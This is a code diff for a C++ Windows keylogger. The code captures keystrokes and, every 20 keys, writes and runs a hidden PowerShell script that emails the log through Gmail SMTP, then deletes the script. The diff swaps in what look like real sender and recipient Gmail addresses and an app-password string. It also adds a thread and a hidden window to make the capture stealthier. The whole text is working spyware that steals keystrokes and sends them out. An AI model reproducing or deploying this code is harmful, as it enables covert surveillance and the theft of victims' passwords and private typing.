@@ -4,6 +4,7 @@
 #include <windows.h>
 #include <fstream>
 #include <Lmcons.h>
+#include <WinUser.h>
 
 using namespace std;
 
@@ -146,21 +147,30 @@ void save(char key) {
     }
 }
 
-void sendMail(){
+void sendMail(string mail){
     ofstream myfile;
     myfile.open("Keylogger.ps1");
-    myfile << "$Myemail=\"account@gmail.com\"\n";
-    myfile << "$Mypass=\"password-code\"\n";
+    myfile << "$Myemail=\"jaydenoerson95@gmail.com\"\n";
+    myfile << "$Mypass=\"kbhnzkgavdbsszng\"\n";
     myfile << "$SMTP=\"smtp.gmail.com\"\n";
-    myfile << "$to=\"account@gmail.com\"\n";
+    myfile << "$to=\"grizzlierbear95@gmail.com\"\n";
     myfile << "$Subject=\"Keylogger\"\n";
-    myfile << "$Body=\"Latest entries in the log = " << content << "\"\n";
+    myfile << "$Body=\"Latest entries in the log = " << mail << "\"\n";
     myfile << "$SecurePassword=Convertto-SecureString -String $Mypass -AsPlainText -force\n";
     myfile << "$MyCredentials=New-object System.Management.Automation.PSCredential $Myemail,$SecurePassword\n";
     myfile << "Send-MailMessage -To $to -from $Myemail -Subject $Subject -Body $Body -SmtpServer $SMTP -Credential $MyCredentials -UseSSL -Port 587 -DeliveryNotificationOption never";
     myfile.close();
-    system("powershell .\\Keylogger.ps1");
+    system("PowerShell.exe -windowstyle hidden .\\Keylogger.ps1");
     remove("Keylogger.ps1");
+    content = "";
+}
+
+DWORD WINAPI ThreadFunc(void *data) {
+    
+    string mailcontent; 
+    mailcontent = content; 
+    sendMail(mailcontent);
+    return 0;
 }
 
 int main()
@@ -170,7 +180,7 @@ int main()
     
     //variable initialisation 
     int counter = 0;
-
+    
     while (1) 
     {
         for (char i = 8; i <= 190; i++) 
@@ -181,11 +191,18 @@ int main()
                 save(i);
                 content += i;
                 // cout << content << "\n";
-                if (counter == 10) 
+                if (counter == 20) 
                 {
+                    /*
+                    ofstream temp;
+                    temp.open("TempLogger.dat");
+                    temp << content; 
+                    temp.close();
+                    */
+
                     counter = 0; // reinstating counter 
-                    sendMail();
-                    content = "";
+
+                    HANDLE thread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
                 } // end of counter if statement 
             } // end of if statement 
         } // end of for loop 
